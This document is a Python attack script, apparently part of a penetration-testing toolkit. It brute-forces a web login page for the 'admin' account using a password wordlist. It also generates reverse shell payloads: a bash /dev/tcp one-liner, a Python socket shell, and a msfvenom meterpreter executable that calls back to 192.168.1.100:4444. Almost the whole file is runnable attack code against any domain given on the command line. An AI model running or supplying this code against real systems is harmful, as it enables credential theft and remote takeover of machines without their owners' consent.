import requests
import os
import subprocess
import time

def brute_force_login(domain, login_path="/login", username="admin", wordlist="data/wordlists/passwords.txt"):
    print(f"[+] Starting login brute-force on {domain}{login_path}")
    url = f"http://{domain}{login_path}"
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist not found: {wordlist}")
        return

    found = None
    with open(wordlist, "r") as f:
        for password in f:
            password = password.strip()
            try:
                r = requests.post(url, data={"username": username, "password": password}, timeout=3)
                if "invalid" not in r.text.lower() and r.status_code == 200:
                    print(f"[✔] Valid credentials: {username}:{password}")
                    found = (username, password)
                    break
            except Exception as e:
                print(f"[!] Request failed for {password}: {e}")
                continue

    return found

def generate_reverse_shell(ip, port, shell_type="bash", output_dir="output/"):
    print(f"[+] Generating reverse shell payload: {shell_type} -> {ip}:{port}")
    os.makedirs(output_dir, exist_ok=True)
    payload = ""
    filename = f"{output_dir}rev_shell.{shell_type}"

    if shell_type == "bash":
        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif shell_type == "python":
        payload = (
            f"import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{ip}\",{port}));"
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"]);"
        )
    elif shell_type == "msfvenom":
        filename = f"{output_dir}payload.exe"
        try:
            subprocess.run([
                "msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={ip}", f"LPORT={port}",
                "-f", "exe", "-o", filename
            ], check=True)
            print(f"[✔] Payload generated: {filename}")
            return filename
        except Exception as e:
            print(f"[-] msfvenom failed: {e}")
            return None
    else:
        print("[-] Unsupported shell type.")
        return None

    with open(filename, "w") as f:
        f.write(payload)

    print(f"[✔] Reverse shell script saved: {filename}")
    return filename

def try_access(domain):
    print(f"\n=== Initial Access Simulation on {domain} ===")
    creds = brute_force_login(domain)
    if creds:
        print(f"[+] SUCCESS: {creds[0]}:{creds[1]}")
    else:
        print("[-] Login brute-force failed.")

    # Example shell generator
    generate_reverse_shell("192.168.1.100", "4444", shell_type="bash")

# Standalone use
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("domain", help="Target domain")
    args = parser.parse_args()
    try_access(args.domain)
